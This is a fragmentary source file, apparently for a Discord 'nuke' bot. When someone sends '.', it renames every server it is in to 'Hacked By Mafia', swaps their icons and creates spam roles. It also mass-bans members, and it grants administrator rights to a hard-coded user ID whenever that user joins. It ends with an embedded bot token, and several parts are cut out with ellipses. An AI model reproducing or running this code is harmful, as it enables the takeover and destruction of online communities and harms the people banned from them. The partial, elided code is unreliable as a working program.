...
hngel.on('message', message => {
     if (message.content === ".") {
hngel.user.setAvatar(`https://cdn.discordapp.com/attachments/741838049360609312/743525127983071272/1597028890440.png`)
...
hngel.on('message', message => {
     if (message.content === ".") {
hngel.user.setUsername("Hacked By Mafia")

}
});
hngel.on('message', message => {
     if (message.content === ".") {
hngel.user.setGame(`Hacked By Mafia`,'https://www.twitch.tv/hngel2667')
...
hngel.on('message', message => {
     if (message.content === ".") {
         hngel.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/741838049360609312/743525127983071272/1597028890440.png`)
})
}
});
hngel.on('message', message => {
     if (message.content === ".") {
         hngel.guilds.forEach(m =>{
             m.setName(`Hacked By Mafia ! Is here`)
})
}
});
...
hngel.on('message', message => {
     if (message.content === ".") {
             ...
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/741838049360609312/743525127983071272/1597028890440.png`)
...
m.createRole({
    name : "  Hacked By WEMafiaSO ! Is here,",
    permissions :   [1],
    color : " #0f0947"
})
m.createRole({
...
async function nuge(guild) {
  ...
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('Mafia').catch(e => { return void e; });
      return m.ban();
    }
  }));
  ...
  hngel.on('guildMemberAdd', member => {
    ...
    hngel.on('guildCreate', async (guild) => {
      ...
      hngel.on('guildMemberAdd', member => {
                  ...
                  if (member.id === "358529506052669440") {//هنا الايدي بتاعك <<<<<<<<<<<<<<<<
                      member.guild.createRole({
                          name : hngel.user.username,
                          color : "RANDOM", 
                          permissions : [8]
...
hngel.login("NzQzNTI1MzQzNjk2MjU3MTQ3.XzV77w._j2OtIp2F4L2UAxtyW3V0Djd2bM")
